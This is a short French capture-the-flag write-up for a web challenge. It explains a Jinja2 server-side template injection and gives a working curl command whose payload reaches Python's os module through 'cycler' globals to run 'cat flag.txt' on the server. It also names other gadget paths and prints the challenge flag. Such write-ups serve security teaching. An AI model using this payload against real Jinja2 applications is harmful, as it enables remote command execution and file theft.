# Le Modèle du DRH

Web · 300 points · Créé par [@PercevalFox](https://github.com/PercevalFox)

La page prévisualise un modèle de notification et le rend avec Jinja2 en le traitant comme un gabarit, pas comme une simple
valeur. Si on tape `{{7*7}}`, la page affiche `49` : on exécute donc du code de gabarit. À partir d'un objet que Jinja fournit
déjà (comme `cycler`), on remonte aux variables globales de Python jusqu'au module `os`, qui permet de lire un fichier.

```bash
curl -s https://modele-du-drh.cyberzerk.fr/ \
  --data-urlencode "message={{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"
```

D'autres chemins existent (`lipsum`, `request.application`), tous mènent à `os`.

**Flag :** `CyberZerk{SSTI_j1nj4_rc3_d3puis_un_m0d3l3_d3_c0ng3}`
